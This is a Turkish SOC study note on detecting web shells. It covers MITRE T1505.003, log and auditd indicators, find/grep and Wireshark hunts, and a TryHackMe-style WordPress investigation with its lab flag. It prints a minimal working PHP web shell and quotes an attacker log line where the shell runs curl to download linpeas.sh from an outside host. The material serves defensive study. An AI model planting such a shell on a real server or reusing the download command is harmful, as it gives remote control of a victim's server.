# 🐚 Detecting Web Shells —  Adli Soruşturma Notu

**Etiketler:** `#SOC` `#WebShell` `#ApacheLogs` `#Auditd` `#LinuxForensics` `#Wireshark` `#IncidentResponse` `#T1505_003` `#TryHackMe`

  

## 🏛️ 1. Mimari Yapı ve Saldırı Yaşam Döngüsü (Web Shell Architecture & Lifecycle)

Bir **Web Shell**, web sunucusuna yetkisiz şekilde yüklenen ve saldırgana uzaktan işletim sistemi seviyesinde komut çalıştırma (**Remote Code Execution - RCE**) yetkisi veren zararlı bir betiktir (script).

  

Siber saldırı zincirinde web shell hem **İlk Erişim (Initial Access - Dosya yükleme açıkları üzerinden)** hem de **Kalıcılık (Persistence - Sistemde uzun süreli arka kapı bırakma)** aşamalarında kritik bir köprüdür.

  

```
       [ 🌐 DIŞ AĞ (Saldırgan) ]
                   │
                   ▼ (1. Zafiyetli Dosya Yükleme / File Upload Vulnerability)
       [ 📁 /var/www/html/uploads/ashadyshell.php ]
                   │
                   ▼ (2. HTTP GET / POST ile Komut Çağrısı: ?cmd=whoami)
 ┌─────────────────────────────────────────────────────────────────────────────┐
 │ 🖥️ WEB SUNUCUSU MOTORU (Apache / Nginx / IIS)                               │
 │                                                                             │
 │   ┌─────────────────────────────────────────────────────────────────────┐   │
 │   │ ⚙️ PHP / ASPX Yürütme Motoru (shell_exec, system, passthru, eval)   │   │
 │   └──────────────────────────────────┬──────────────────────────────────┘   │
 │                                      │ (3. Syscall Çağrısı: execve)         │
 │                                      ▼                                      │
 │   ┌─────────────────────────────────────────────────────────────────────┐   │
 │   │ 🐧 İŞLETİM SİSTEMİ ÇEKİRDEĞİ & KABUK (/bin/bash, /bin/sh)           │   │
 │   │    • Çalışan Kullanıcı: www-data (Düşük yetkili web servisi)        │   │
 │   │    • Sonraki Adım: Recon, Privilege Escalation (linpeas.sh), C2     │   │
 │   └─────────────────────────────────────────────────────────────────────┘   │
 └─────────────────────────────────────────────────────────────────────────────┘
```

### 🔹 MITRE ATT&CK ve Gerçek Dünya Vakaları

- **MITRE ATT&CK:** **T1505.003** (_Persistence: Server Software Component - Web Shell_)
    
      
    
- **Hafnium (ProxyLogon - APT):** Çin merkezli tehdit aktörü, Microsoft Exchange sunucularındaki açıkları kullanarak `\inetpub\wwwroot\aspnet_client\` ve OWA kimlik doğrulama dizinlerine **`.aspx`** uzantılı web shell'ler yerleştirmiştir.
    
      
    
- **Conti Ransomware:** Exchange açıklarını istismar ederek aynı `\aspnet_client\` dizinine `aspnetclient_log.aspx` adında web shell yüklemiş, dakikalar içinde yedek shell'ler bırakarak etki alanı yöneticilerini (Domain Admins) haritalandırmıştır.
    
      
    

## 🔬 2. Web Shell Anatomisi: Meşru Fonksiyonların İstismarı

Web shell'ler sıfırdan sihirli bir kod çalıştırmaz; programlama dillerinin sistem yöneticileri için sunduğu **meşru sistem çalıştırma fonksiyonlarını** kötüye kullanır.

  

### 🔹 PHP Sistem Fonksiyonları

- `shell_exec($cmd)`: Komutu kabukta çalıştırır ve tüm çıktıyı bir metin dizisi olarak döner.
    
      
    
- `system($cmd)`: Komutu çalıştırır, çıktıyı anında ekrana basar ve son satırı döner.
    
      
    
- `exec($cmd)`: Komutu çalıştırır, sadece çıktının son satırını döner.
    
      
    
- `passthru($cmd)`: Ham çıktıyı (binary dahil) doğrudan istemciye aktarır.
    
      
    
- `eval($code)`: Metin olarak verilen PHP kodunu doğrudan yorumlar (genellikle Base64 veya şifrelenmiş payload'ları çözüp çalıştırmak için kullanılır).
    
      
    

PHP

```
<?php
// Minimalist Bir Web Shell Anatomisi
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>
```

> [!WARNING]
> 
> **Web Servis Kullanıcısı Riski:** Web shell çalıştığında sunucu üzerindeki komutlar genellikle web sunucusunun servis kullanıcısı yetkisiyle (`www-data`, `apache` veya `IUSR`) çalışır. Saldırgan bu noktadan sonra yetki yükseltmek (**Privilege Escalation**) için çekirdek açıkları arar veya sistem betikleri (`linpeas.sh`) indirir.
> 
>   

## 📊 3. Çok Katmanlı Tespit Göstergeleri ve Log Korelasyonu

Bir web shell'i kesin olarak tespit etmek için 3 farklı telemetri kaynağının birbiriyle eşleştirilmesi (korelasyon) gerekir:

  

```
[ 📜 Web Erişim Logları ]  +  [ 🐧 Auditd Sistem Çağrıları ]  +  [ 📦 PCAP Ağ Yükü ]
 (Kayıp Referrer, POST URI)      (creat, execve syscall'leri)       (Cleartext POST Payloads)
```

### 🔹 HTTP Metotları ve Kötüye Kullanım Matrisi

|**HTTP Metodu**|**Normal Kullanım Amacı**|**Web Shell & Saldırı İstismarı**|
|---|---|---|
|**GET**|Sunucudan statik/dinamik kaynak çekme.|Keşif yapma (Recon) veya `?cmd=...` ile URL üzerinden web shell ile etkileşime girme.|
|**POST**|Sunucuya form/veri gönderme.|Web shell dosyasını yükleme veya gizli POST parametreleriyle komut çalıştırma.|
|**PUT**|Sunucuya doğrudan dosya yükleme/üzerine yazma.|Web sunucu yapılandırma hatasından faydalanıp shell dosyasını doğrudan diske yazma.|
|**DELETE**|Sunucudan kaynak silme.|Saldırganın delilleri yok etmek için shell veya araçları temizlemesi (Cleanup).|
|**OPTIONS**|Sunucunun desteklediği metotları sorgulama.|Saldırganın PUT/DELETE metotlarının açık olup olmadığını anlamak için yaptığı keşif.|
|**HEAD**|Sadece HTTP başlıklarını çekme.|Yüklenen web shell'in çalışıp çalışmadığını loglarda az iz bırakarak denetleme.|

### 🔹 Web Erişim Loglarında Web Shell Göstergeleri

1. **Şüpheli Parametreler (Query Strings):** URL içinde `?cmd=`, `?exec=`, `?c=` gibi anahtar kelimelerin bulunması veya Base64 ile encode edilmiş dizilimler (`?query=d2hvYW1p`).
    
      
    
2. **Kayıp Referrer (Missing Referrer):** İstek doğrudan URL yazılarak veya script ile atıldığında `Referer` başlığı boş kalır (`"-"`).
    
      
    
3. **Anormal User-Agent:** Tarayıcı dışı başlıklar (`curl/7.68.0`, `wget/1.20.3`, `python-requests`) veya eski/değiştirilmiş User-Agent stringleri.
    
      
    
4. **Hızlı İstek Dizilimi:** Peş peşe gelen `404 Not Found` (dizin/dosya keşfi) ardından tekil bir `200 OK` ve sonrasında gelen `POST /upload...` isteği.
    
      
    

### 🔹 Linux Auditd & Syscall Korelasyonu

Linux çekirdeğindeki `auditd` modülü, dosya yazma ve komut çalıştırma olaylarını kayıt altına alır:

  

- `creat` / `openat (O_CREAT)`: Web dizinine yeni bir `.php` dosyasının yazıldığını doğrular.
    
      
    
- `execve`: `www-data` kullanıcısının `/bin/sh` veya sistem araçlarını (`whoami`, `cat`, `curl`) çalıştırdığını kanıtlar.
    
      
    

Bash

```
# Auditd loglarında web shell etiketli kuralı arama
ausearch -k web_shell
```

- **Örnek Çıktı:**
    
      
    

Plaintext

```
time->Wed Jul 23 06:20:36 2025
type=SYSCALL ... syscall=execve success=yes exe="/bin/dash"
name="/uploads/webshell.php" OGID="www-data"
```

## 🛠️ 4. Dosya Sistemi ve Ağ Seviyesinde Adli Arama Komutları

### 🔹 Dosya Sistemi Analizi (CLI Refleksleri)

Saldırganlar web shell'leri genellikle `/var/www/html/uploads/`, `/images/`, `/tmp` veya WordPress'te `wp-content/uploads/` dizinlerine bırakırlar.

  

Bash

```
# Belirli bir dizinde sonradan oluşturulmuş veya değiştirilmiş PHP dosyalarını bulma
find /var/www/ -type f -name "*.php"

# İki belirli tarih arasında oluşturulmuş şüpheli PHP dosyalarını listeleme
find /var/www -type f -name "*.php" -newerct "2025-07-01" ! -newerct "2025-08-01"

# Dosya içeriklerinde tehlikeli fonksiyonları (eval, shell_exec, system) arama
grep -rnw '/var/www/' -e "eval("
grep -rnw '/var/www/' -e "shell_exec("
grep -rnw '/var/www/' -e "system("
```

- `-type f`: Sadece normal dosyaları ara.
    
      
    
- `-name "*.php"`: Sadece `.php` uzantılı dosyaları eşleştir.
    
      
    
- `-newerct`: Belirtilen tarihten daha yeni (`newer`) oluşturulmuş/değiştirilmiş (`ct: change time`) dosyaları süz.
    
      
    
- `-r` / `-rnw`: Dizini yinelemeli (recursive) ara, satır numarasını göster (`n`), tam kelimeyi eşleştir (`w`).
    
      
    

> [!TIP]
> 
> **Çift Uzantı (Double Extension) Tuzağı:** Saldırganlar web filtrelerini atlatmak için `image.jpg.php` veya `avatar.php.png` gibi çift uzantılar kullanabilir. Sistemde sadece resim olması gereken `/uploads/` dizininde çalıştırılabilir script varlığı doğrudan **Kötü Niyet Belirtecidir (IoC)**.
> 
>   

### 🔹 Wireshark Ağ Paketi Filtreleri

Kod snippet'i

```
# Belirli bir HTTP metodunu arama (Örn: Doğrudan dosya yükleme teşebbüsü)
http.request.method == "PUT"
http.request.method == "POST"

# URL içinde PHP uzantısı geçen tüm istekleri izole etme
http.request.uri contains ".php"

# Standart dışı veya tarayıcı dışı User-Agent başlıklarını yakalama
http.user_agent contains "curl" || http.user_agent contains "python"
```

## 🕵️‍♂️ 5. TryBankMe / WordPress Vaka İncelemesi (Laboratuvar Soruşturması)

Bu bölümde, `/var/log/apache2/access.log` kayıtları ve sunucu dosya sistemi üzerinden adım adım soruşturma yürütülmüştür.

  

```
[ ADLİ ANALİZ ZİNCİRİ ]
1. Fuzzing / Tarama Tespiti  ──► grep "404" (Saldırgan IP'sinin saptanması: 203.0.113.66)
2. Başarılı Dizin Keşfi       ──► grep "200" (İlk bulunan dizin: /wordpress)
3. Shell Yükleme Noktası      ──► grep "upload" (Yükleme formu: upload_form.php)
4. Shell Etkileşimi           ──► grep "cmd=" (İlk komut: whoami, İkinci araç: linpeas.sh)
5. Kaynak Kod İncelemesi      ──► cat ashadyshell.php (İçerikteki gizli flag)
```

### 🔹 Adli Bilişim Terminal Komutları ve Çıkarımları

#### 1. Saldırgan IP Adresini ve Dizin Taramasını Yakalama

Saldırgan sistemde olmayan sayfaları tararken (`fuzzing`) sunucu yoğun şekilde `404 Not Found` hatası döner:

  

Bash

```
cat /var/log/apache2/access.log | grep " 404 " | cut -d ' ' -f 1 | sort | uniq -c | sort -nr
```

- **Bulgu:** Loglarda binlerce 404 isteği atan tek bir dış IP tespit edildi: **`203.0.113.66`**.
    
      
    

#### 2. Saldırganın Başarılı Olduğu İlk Dizini Bulma

Saldırgan IP'sinin başarılı (`200 OK`) sonuç aldığı dizinleri filtreliyoruz:

  

Bash

```
grep "203.0.113.66" /var/log/apache2/access.log | grep " 200 "
```

- **Bulgu:** Saldırganın keşfettiği ilk geçerli dizin: **`/wordpress`**.
    
      
    

#### 3. Web Shell'in Yüklendiği Formun Tespiti

Loglarda dosya yükleme (`upload`) ile ilgili PHP dosyalarını süzüyoruz:

  

Bash

```
grep "203.0.113.66" /var/log/apache2/access.log | grep -i "upload"
```

- **Bulgu:** Saldırganın web shell yüklemek için kullandığı sayfa: **`upload_form.php`**.
    
      
    

#### 4. Saldırganın Çalıştırdığı Komutları ve İndirilen Dosyaları Çözümleme

Saldırganın yüklediği web shell ile girdiği etkileşimleri (`?cmd=` parametresi üzerinden) listeliyoruz:

  

Bash

```
grep "203.0.113.66" /var/log/apache2/access.log | grep "cmd="
```

- **Log Satırı 1:** `GET /wordpress/wp-content/uploads/ashadyshell.php?cmd=whoami HTTP/1.1 200`
    
      
    - Saldırganın shell üzerinden çalıştırdığı ilk komut: **`whoami`**.
        
          
        
- **Log Satırı 2:** `GET /wordpress/wp-content/uploads/ashadyshell.php?cmd=curl%20http://.../linpeas.sh%20-o%20linpeas.sh HTTP/1.1 200`
    
      
    - Saldırgan yetki yükseltme amacıyla dış sunucudan ikinci bir zararlı betik indirmiştir: **`linpeas.sh`**.
        
          
        

#### 5. Web Shell Kaynak Kodunun Analizi (Flag Avı)

Saldırganın yüklediği dosyanın bulunduğu dizine gidip kaynak kodunu ekrana basıyoruz:

  

Bash

```
cat /var/www/html/wordpress/wp-content/uploads/ashadyshell.php
```

- **Bulgu:** Kod blokları arasındaki yorum satırında gizlenen bayrak: **`THM{W3b_Sh3ll_Intr1nals}`**.

## 🚦 7. Tekrar Kategorisi & 3 Dakikalık Pazar Tekrar Stratejisi

### 🔴 Kırmızı Sınıf: Pratik Log Kazıma & Linux Adli Komutları

Bu modül **Kırmızı Sınıf** (Terminal Boru Hatları, Linux Adli Komutları & Syscall İmzaları) kategorisindedir.

  

### ⏱️ Pazar Günü 3 Dakikalık Hızlı Tekrar Rutini

1. **Adli Komut Zincirini Zihninde Çalıştır (1. Dakika):**
    
      
    - _Dosya arama:_ `find /var/www/ -type f -name "*.php" -newerct "2026-09-01"`
        
          
        
    - _Zararlı fonksiyon avı:_ `grep -rnw '/var/www/' -e "eval("`
        
          
        
    - _Logda tarama yakalama:_ `cat access.log | grep " 404 " | cut -d ' ' -f 1 | sort | uniq -c`
        
          
        
2. **Kritik İmzaları Sırala (2. Dakika):**
    
      
    - MITRE Tekniği: `T1505.003` (Server Software Component: Web Shell)
        
          
        
    - Auditd Syscall: `creat` (Dosya yazma/oluşturma), `execve` (Komut yürütme)
        
          
        
    - Tehlikeli PHP fonksiyonları: `shell_exec`, `system`, `passthru`, `eval`
        
          
        
3. **Mülakat Sorusu Canlandırması (3. Dakika):**
    
      
    - _Soru:_ "Web sunucumuza bir web shell yüklendiğinden şüpheleniyorsun, sırasıyla ne yaparsın?"
        
          
        
    - _Cevap:_ "Önce access loglarında alışılmadık POST isteklerini ve `?cmd=` gibi query string içeren anomalileri tararım. Şüpheli bir dosya görürsem `find` ve `grep` ile `/var/www/html/` altında arama yapar, kaynak kodundaki sistem fonksiyonlarını (`shell_exec`, `eval`) incelerim. Son olarak `auditd` loglarında `creat` ve `execve` çağrılarını kontrol ederek hangi kullanıcının (`www-data`) hangi process'i tetiklediğini doğrularım."
